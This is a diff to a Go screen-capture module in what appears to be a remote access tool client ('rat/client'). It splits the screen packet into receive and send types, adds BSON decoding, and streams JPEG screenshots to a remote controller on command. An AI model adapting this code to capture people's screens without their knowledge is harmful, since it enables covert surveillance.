@@ -2,10 +2,13 @@ package main
 
 import (
 	"bytes"
+	"fmt"
 	"image"
 	"image/jpeg"
-	"rat/client/screen"
 	"rat/client/network/header"
+	"rat/client/screen"
+
+	"gopkg.in/mgo.v2/bson"
 
 	"github.com/disintegration/imaging"
 )
@@ -15,23 +18,30 @@ var monitor bool
 var handle int
 var scale float32
 
-type ScreenPacket struct {
-	Run     bool    `network:"receive"`
-	Scale   float32 `network:"receive"`
-	Monitor bool    `network:"receive"`
-	Handle  int     `network:"receive"`
-	Buffer  []byte  `network:"send"`
+type RecvScreenPacket struct {
+	Run     bool    "active"
+	Scale   float32 "scale"
+	Monitor bool    "monitor"
+	Handle  int     "handle"
 }
 
-func (packet ScreenPacket) Header() header.PacketHeader {
+func (packet RecvScreenPacket) Header() header.PacketHeader {
 	return header.ScreenHeader
 }
 
-func (packet ScreenPacket) OnReceive() error {
+type SendScreenPacket struct {
+	Buffer []byte "buffer"
+}
+
+func (packet SendScreenPacket) Header() header.PacketHeader {
+	return header.ScreenHeader
+}
+
+func (packet RecvScreenPacket) OnReceive() error {
 	if packet.Run {
 		// Dispatch one screen packet
 		screenStream = false
-		Queue <- &ScreenPacket{}
+		Queue <- &SendScreenPacket{}
 	}
 
 	screenStream = packet.Run
@@ -42,7 +52,8 @@ func (packet ScreenPacket) OnReceive() error {
 	return nil
 }
 
-func (packet *ScreenPacket) Init() {
+func (packet *SendScreenPacket) Init() {
+	fmt.Println("sending screen")
 	screen.QueryMonitors()
 
 	var w bytes.Buffer
@@ -82,4 +93,9 @@ func (packet *ScreenPacket) Init() {
 			Queue <- packet
 		}()
 	}
+}
+
+func (packet RecvScreenPacket) Decode(buf []byte) (IncomingPacket, error) {
+	err := bson.Unmarshal(buf, &packet)
+	return packet, err
 }
